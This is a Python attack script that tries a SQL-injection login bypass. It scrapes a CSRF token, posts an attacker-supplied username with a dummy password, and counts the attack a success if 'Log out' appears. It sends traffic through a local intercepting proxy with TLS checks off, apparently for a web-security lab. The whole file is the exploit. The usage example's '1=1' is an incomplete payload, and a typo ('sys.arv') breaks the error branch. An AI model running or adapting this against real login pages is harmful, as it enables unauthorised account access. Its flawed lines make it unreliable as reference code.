import requests
import sys
import urllib3

from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FAIL = -1

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

def get_csrf_token(url, session):
    response = session.get(
        url,
        verify=False,
        proxies=proxies)
    html = BeautifulSoup(
        response.text, 
        'html.parser')
    csrf = html.find("input")['value']
    return csrf

def is_exploitable(url, user, session):
    csrf = get_csrf_token(url, session)
    data = {"csrf": csrf,
            "username": user,
            "password": "randomtext"}
    response = session.post(
        url, 
        data=data,
        verify=False,
        proxies=proxies)
    return "Log out" in response.text

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        user = sys.argv[2].strip()
        session = requests.Session()
        if is_exploitable(url, user, session):
            print("[+] SQL injection successful!")
        else:
            print("[-] SQL injection unsuccessful")
    except IndexError:
        print("[-] Usage: %s <url> <user>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.arv[0])
        sys.exit(FAIL)